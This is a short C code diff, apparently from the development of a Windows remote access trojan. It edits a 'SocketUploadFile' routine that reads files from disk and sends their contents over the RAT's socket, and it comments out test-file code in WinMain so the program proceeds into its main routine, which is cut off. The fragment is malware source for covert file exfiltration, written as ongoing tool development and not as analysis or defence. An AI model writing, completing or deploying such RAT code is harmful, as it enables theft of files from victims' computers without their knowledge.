@@ -62,10 +62,6 @@ int SocketUploadFile(RATSocket* ratSocket, char* filePath)
 			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
 			if ( readSize > 0 )
 			{
-				char sizeToSend[FILE_SIZE_DIGIT_SIZE] = {};
-				_itoa_s((int)readSize, sizeToSend, FILE_SIZE_DIGIT_SIZE, 10);
-				
-				SocketSend(ratSocket, sizeToSend, FILE_SIZE_DIGIT_SIZE);
 				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
@@ -123,22 +119,22 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
-	HANDLE fileHandle = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if ( fileHandle == INVALID_HANDLE_VALUE )
-	{
-		OutputDebugStringA("Error");
-	}
+	// HANDLE fileHandle = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	// if ( fileHandle == INVALID_HANDLE_VALUE )
+	// {
+	// 	OutputDebugStringA("Error");
+	// }
 
-	char* toWriteBuffer = "This is a test.";
-	DWORD bytesWritten;
-	WriteFile(fileHandle, toWriteBuffer, 15, &bytesWritten, 0);
+	// char* toWriteBuffer = "This is a test.";
+	// DWORD bytesWritten;
+	// WriteFile(fileHandle, toWriteBuffer, 15, &bytesWritten, 0);
 
-	char buffer[256];
-	sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
-	OutputDebugStringA(buffer);
+	// char buffer[256];
+	// sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
+	// OutputDebugStringA(buffer);
 	
-	CloseHandle(fileHandle);
-	return 0;
+	// CloseHandle(fileHandle);
+	// return 0;
 	
 	srand( (unsigned)time( NULL ) );
 	
